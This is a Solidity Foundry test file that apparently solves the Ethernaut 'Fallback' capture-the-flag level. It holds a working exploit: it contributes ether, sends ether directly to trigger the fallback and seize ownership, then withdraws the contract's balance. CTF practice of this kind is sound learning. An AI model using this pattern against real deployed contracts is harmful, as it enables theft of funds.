// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Fallback.sol";
import "src/levels/FallbackFactory.sol";

contract TestFallback is BaseTest {
    Fallback private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new FallbackFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = Fallback(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.owner(), address(levelFactory));
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */
        vm.startPrank(player); // 设置发起者为player

        // 充值0.0001 ether
        // main.handlePayment.value(msg.value)(msg.sender);
        level.contribute{value : 0.0001 ether}();
        uint256 balance = level.getContribution();
        console.log("balance : %s", balance);

        // 往合约里转钱
        (bool sent,) = address(level).call{value : 1}("");
        require(sent, "Failed to send Ether");

        level.withdraw();
        vm.stopPrank();
    }
}
